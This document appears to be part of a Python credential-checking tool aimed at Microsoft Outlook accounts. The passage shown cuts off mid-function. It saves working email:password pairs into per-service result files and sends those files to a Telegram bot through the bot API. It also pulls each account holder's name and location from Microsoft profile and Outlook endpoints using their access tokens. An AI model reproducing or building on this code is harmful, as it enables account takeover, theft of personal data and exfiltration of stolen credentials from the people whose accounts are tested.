#@bleskkk | @bleskkk 
import os , uuid , concurrent.futures
try:
	import requests
	from rich.console import Console
	from rich.panel import Panel
except ImportError:
	os.system('pip install requests rich')
	os.system('clear')	

print("Success.")
a,b=0,0
Tok = input('Enter Token : ')
id = input('Enter ID : ')

# Create results directory if it doesn't exist
if not os.path.exists('results'):
	os.makedirs('results')

def send_file_to_telegram(file_path, caption=""):
	"""Send a file to Telegram bot"""
	try:
		with open(file_path, 'rb') as file:
			files = {'document': file}
			data = {'chat_id': id, 'caption': caption}
			url = f"https://api.telegram.org/bot{Tok}/sendDocument"
			requests.post(url, files=files, data=data)
	except Exception as e:
		print(f"Error sending file: {e}")

def save_to_file(email, password, app_name, name="", country=""):
	"""Save valid credentials to app-specific file"""
	filename = f"results/{app_name.replace(' ', '_').replace('🎁', '').strip()}.txt"
	with open(filename, 'a', encoding='utf-8') as f:
		f.write(f"{email}:{password}\n")
	return filename

class all:
	@staticmethod
	def get_infoo(Email,Password,token,CID) -> str:
		he = {
		    "User-Agent": "Outlook-Android/2.0",
		    "Pragma": "no-cache",
		    "Accept": "/json",
		    "ForceSync": "false",
		    "Authorization": f"Bearer {token}",
		    "X-AnchorMailbox": f"CID:{CID}",
		    "Host": "substrate.office.com",
		    "Connection": "Keep-Alive",
		    "Accept-Encoding": "gzip"}
		r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",headers=he).json()
		info_name=(r.get('names', []))
		info_Loca=(r.get('accounts',[]))
		name=info_name[0]['displayName']
		Loca=info_Loca[0]['location']
		url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0"	
		headers = {
		    "Host": "outlook.live.com",
		    "content-length": "0",
		    "x-owa-sessionid": f"{CID}",
		    "x-req-source": "Mini",
		    "authorization": f"Bearer {token}",
  
